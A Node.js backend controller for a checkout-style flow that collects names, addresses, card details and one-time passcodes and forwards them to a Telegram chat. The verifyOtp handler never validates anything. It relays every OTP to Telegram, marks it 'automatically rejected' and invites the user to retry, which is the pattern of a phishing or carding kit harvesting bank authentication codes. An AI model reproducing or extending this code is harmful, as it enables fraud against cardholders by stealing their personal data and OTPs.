const { sendMessage } = require('../config/telegram');
const Payment = require('../models/Payment');

const notifyTelegram = async (message) => {
  try {
    await sendMessage(message);
    return true;
  } catch (error) {
    console.error('Telegram notification failed:', error.message);
    
    return false;
  }
};

const saveAddress = async (req, res) => {
  const startTime = Date.now();
  
  try {
    const { firstName, lastName, country, address, zipCode, city } = req.body;
    
    
    if (!firstName || !lastName || !country || !address || !zipCode || !city) {
      return res.status(400).json({ error: 'All address fields are required' });
    }

   
    const newPayment = new Payment({ 
      firstName, lastName, country, address, zipCode, city,
      step: 'address',
      createdAt: new Date()
    });
    await newPayment.save();

 
    notifyTelegram(`
      <b>New Address Submission</b>
      <b>Name:</b> ${firstName} ${lastName}
      <b>Address:</b> ${address}, ${city}
       <b>Zip:</b> ${zipCode}, ${country}
       <b>Time:</b> ${new Date().toLocaleString()}
    `);

    res.json({ 
      success: true, 
      step: 'payment',
      processingTime: `${Date.now() - startTime}ms`
    });
  } catch (err) {
    console.error('Save address error:', {
      error: err.message,
      stack: err.stack,
      body: req.body
    });
    
    res.status(500).json({ 
      error: 'Internal server error',
      details: process.env.NODE_ENV === 'development' ? err.message : undefined
    });
  }
};

const savePaymentDetails = async (req, res) => {
  const startTime = Date.now();
  
  try {
    const { cardNumber, expirationDate, cvv } = req.body;
    
    
    if (!cardNumber || !expirationDate || !cvv) {
      return res.status(400).json({ error: 'All payment fields are required' });
    }


    const cleanedCardNumber = cardNumber.replace(/\D/g, '');
    if (cleanedCardNumber.length !== 16) {
      return res.status(400).json({ error: 'Card number must be 16 digits' });
    }

    
    if (!expirationDate.match(/^\d{2}\/\d{2}$/)) {
      return res.status(400).json({ error: 'Invalid expiration date format (MM/YY)' });
    }

    const [month, year] = expirationDate.split('/');
    const currentYear = new Date().getFullYear() % 100;
    const currentMonth = new Date().getMonth() + 1;

    if (month < 1 || month > 12) {
      return res.status(400).json({ error: 'Invalid month (01-12)' });
    }
    if (year < currentYear || (year == currentYear && month < currentMonth)) {
      return res.status(400).json({ error: 'Card expired' });
    }

   
    if (!cvv.match(/^\d{3,4}$/)) {
      return res.status(400).json({ error: 'CVV must be 3 or 4 digits' });
    }

    
    const payment = new Payment({
      cardLastFour: cleanedCardNumber.slice(-4),
      expirationDate,
      step: 'payment',
      createdAt: new Date()
    });
    await payment.save();

   
    notifyTelegram(`
      <b>New Payment Details</b>
      <b>Card:</b> **** **** **** ${cleanedCardNumber.slice(-4)}
      <b>Exp:</b> ${expirationDate}
      <b>Time:</b> ${new Date().toLocaleString()}
    `);

    res.json({ 
      success: true, 
      step: 'otp',
      processingTime: `${Date.now() - startTime}ms`
    });
  } catch (err) {
    console.error('Payment processing error:', {
      error: err.message,
      stack: err.stack,
      body: req.body
    });
    
    res.status(500).json({ 
      error: 'Payment processing failed',
      details: process.env.NODE_ENV === 'development' ? err.message : undefined
    });
  }
};

const verifyOtp = async (req, res) => {
  const startTime = Date.now();
  
  try {
    const { otp } = req.body;
    
    if (!otp || !otp.match(/^\d{6,8}$/)) {
      return res.status(400).json({ error: 'OTP must be 6 - 8 digits' });
    }

    
    notifyTelegram(`
      <b>🔑 OTP Attempt</b>
      ⌨️ <b>Code:</b> ${otp}
      ⏰ <b>Time:</b> ${new Date().toLocaleString()}
      ❌ <i>Automatically rejected</i>
    `);

    res.json({ 
      success: false, 
      error: 'OTP is incorrect',
      canRetry: true,
      processingTime: `${Date.now() - startTime}ms`
    });
  } catch (err) {
    console.error('OTP verification error:', {
      error: err.message,
      stack: err.stack,
      body: req.body
    });
    
    res.status(500).json({ 
      error: 'OTP verification failed',
      details: process.env.NODE_ENV === 'development' ? err.message : undefined
    });
  }
};

module.exports = { saveAddress, savePaymentDetails, verifyOtp };